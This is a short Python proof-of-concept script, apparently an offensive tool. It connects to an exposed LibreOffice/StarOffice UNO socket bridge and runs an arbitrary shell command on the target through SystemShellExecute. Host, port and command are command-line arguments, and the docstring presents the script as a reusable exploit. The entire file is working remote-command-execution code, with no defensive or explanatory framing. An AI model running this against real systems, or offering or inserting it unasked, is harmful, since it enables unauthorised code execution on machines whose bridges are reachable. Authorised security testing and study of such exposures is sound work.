#!/usr/bin/env python3
"""LibreOffice UNO remote command execution stager.

Connects to a StarOffice UNO socket bridge on the target and executes one
command through ``com.sun.star.system.SystemShellExecute``. Host, port and
command are CLI arguments so the PoC works as a reusable verb; defaults
preserve the original localhost:2002 behaviour.
"""

import argparse


def main() -> None:
    """Parse arguments, resolve the UNO bridge and execute the command."""
    parser = argparse.ArgumentParser(description="LibreOffice UNO SystemShellExecute PoC")
    parser.add_argument("--host", default="localhost", help="UNO bridge host (default: localhost)")
    parser.add_argument("--port", type=int, default=2002, help="UNO bridge port (default: 2002)")
    parser.add_argument("--command", default="id", help="Command to execute on the target (default: id)")
    args, _unknown = parser.parse_known_args()

    try:
        import uno
    except ImportError as exc:
        raise SystemExit(f"[!] python3-uno is required for the UNO bridge: {exc}") from exc

    local = uno.getComponentContext()
    resolver = local.ServiceManager.createInstanceWithContext("com.sun.star.bridge.UnoUrlResolver", local)
    context = resolver.resolve(
        f"uno:socket,host={args.host},port={args.port};urp;StarOffice.ComponentContext"
    )
    executor = context.ServiceManager.createInstanceWithContext(
        "com.sun.star.system.SystemShellExecute", context
    )
    executor.execute("/bin/sh", f"-c {args.command}", 1)
    print(f"[+] executed via UNO bridge {args.host}:{args.port}: {args.command}")


if __name__ == "__main__":
    main()
